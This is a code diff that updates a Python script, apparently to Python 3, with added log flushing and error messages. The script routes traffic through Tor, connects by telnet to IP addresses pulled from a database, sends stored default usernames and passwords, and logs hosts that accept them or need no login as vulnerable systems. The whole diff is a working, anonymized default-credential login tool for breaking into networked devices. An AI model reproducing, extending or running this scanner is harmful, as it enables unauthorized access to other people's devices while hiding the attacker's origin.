@@ -33,8 +33,9 @@ def connectTor():
     socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9150, True)
     socket.socket = socks.socksocket
     
-    data = json.loads(urlopen("http://ip-api.com/json").read())
+    data = json.loads(urlopen("http://ip-api.com/json").read().decode("latin1"))
     g.write('Testing data using IP: ' + data["query"] + "\n")
+    g.flush()
 
     cursor_10 = db_10.cursor()
     # cursor_10_insert = db_10.cursor()
@@ -71,6 +72,7 @@ def connectTor():
                 ip = row[1]
                 # Now print fetched result
                 g.write("IP = %s\n" % ip)
+                g.flush()
                 # requests.session(headers=headers, hooks=hooks, verify=False)
                 ipaddr = ip
                 # print('connected to device, no login')
@@ -88,36 +90,42 @@ def connectTor():
 
                         tn = telnetlib.Telnet(HOST, '', 4)
                         g.write("tel success\n")
+                        g.flush()
 
                         try:
-                            line = tn.read_until("A$tring+hatWouldN0tExist", 3)
+                            line = tn.read_until("A$tring+hatWouldN0tExist".encode('ascii','ignore'), 3)
 
                             strline = str(line)
                             strline = strline.replace('\'', '')
                             line = strline.lower()
-                            # print line
+                            # g.write(line+"\n")
                             if ("login" in line) or ("user" in line) or ("password" in line) or \
                                     ("closing connection" in line):
                                 try:
-                                    g.write(passID+"\n")
+                                    g.write(str(passID)+"\n")
+                                    g.flush()
                                     try:
-                                        tn.write(user + "\n")
+                                        tn.write(user + b"\n")
                                         g.write("Success user write\n")
+                                        g.flush()
                                     except Exception as e:
                                         g.write("Fail user write %s\n" % e)
+                                        g.flush()
                                         tn.close()
                                     if password:
                                         # reg = re.compile("password", re.I)
                                         # print tn.expect(reg)
-                                        tn.read_until("assword: ", 3)
+                                        tn.read_until(b"assword: ", 3)
                                         try:
-                                            tn.write(password + "\n")
+                                            tn.write(password + b"\n")
                                             g.write("Success pass write\n")
+                                            g.flush()
                                         except:
                                             g.write("Fail pass write")
+                                            g.flush()
                                             tn.close()
                                     try:
-                                        line2 = tn.read_until("A$tring+hatWouldN0tExist", 5)
+                                        line2 = tn.read_until("A$tring+hatWouldN0tExist".encode('ascii','ignore'), 5)
 
                                         strline = str(line2)
                                         strline = strline.replace('\'', '')
@@ -131,16 +139,22 @@ def connectTor():
                                                 sql = "INSERT INTO vulnerablesystems_test(ip_id, ipaddr, passwordid, notes, openport) \
                                                            VALUES ('%s', '%s', '%s', '%s', '%s')" % (
                                                     ip_id, ipaddr, passID, line, '')
+                                                f.write(sql)
+                                                f.write("\n")
+                                                f.flush()
+                                                g.write("successfully inserted a default pass\n")
+                                                g.flush()
                                                 tn.close()
                                                 break
                                             except:
                                                 g.write('error on SQL insert\n')
+                                                g.flush()
                                                 tn.close()
                                             # try:
                                             # Log the SQL command
-                                            f.write(sql)
-                                            f.write("\n")
-                                            g.write("successfully inserted a default pass\n")
+                                            # f.write(sql)
+                                            # f.write("\n")
+                                            # g.write("successfully inserted a default pass\n")
                                             # except Exception as e:
                                             #     g.write('Error: %s\n' % e)
                                             #     # Rollback in case there is any error
@@ -152,40 +166,48 @@ def connectTor():
                                             tn.close()
                                         else:
                                             g.write("User and Psw don't match\n")
+                                            g.flush()
                                             tn.close()
 
-                                    except:
-                                        g.write("Error on connecting\n")
+                                    except Exception as e:
+                                        g.write("Error on connecting: %s\n" % e) 
+                                        g.flush()
                                         tn.close()
 
-                                except:
-                                    g.write('Error on info retrieve\n')
+                                except Exception as e:
+                                    g.write('Error on info retrieve: %s\n' % e)
+                                    g.flush()
                                     tn.close()
 
                                 tn.close()
                             elif ("refuse" in line) or ("reject" in line):
                                 g.write("connection refused\n")
+                                g.flush()
                                 tn.close()
                             else:
                                 g.write("No known login needed\n")
                                 g.write(line)
+                                g.flush()
                                 try:
                                     # print passID
                                     sql = "INSERT INTO vulnerablesystems_test(ip_id, ipaddr, passwordid, notes, openport) \
                                                VALUES ('%s', '%s', '%s', '%s', '%s')" % (
                                         ip_id, ipaddr, '5002', line, 'no login needed')
                                     tn.close()
+                                    f.write(sql)
+                                    f.write("\n")
+                                    f.flush()
+                                    g.write("successfully inserted a default pass\n")
+                                    g.flush()
                                     break
-                                except:
-                                    g.write('Error on SQL insert\n')
+                                except Exception as e:
+                                    g.write('Error on SQL insert %s\n' % e)
+                                    g.flush()  
                                     tn.close()
                                 # try:
 
                                 # Log the SQL command
-                                f.write(sql)
-                                f.write("\n")
-                                g.write("successfully inserted a default pass\n")
-
+                               
                                 # except Exception as e:
                                 #     print('Error: %s' % e)
                                 #     # Rollback in case there is any error
@@ -195,15 +217,18 @@ def connectTor():
                                 tn.close()
 
                             # print(tn.read_all())
-                        except:
-                            g.write("Telnet Server Not Available\n")
+                        except Exception as e:
+                            g.write("Telnet Server Not Available %s\n" % e)
+                            g.flush() 
                             tn.close()
 
                 except Exception as e:
                     g.write('server timeout: %s\n' % e)
+                    g.flush()
 
         except Exception as e:
             g.write('Error: %s\n' % e)
+            g.flush()
 
         f.close()
         g.close()
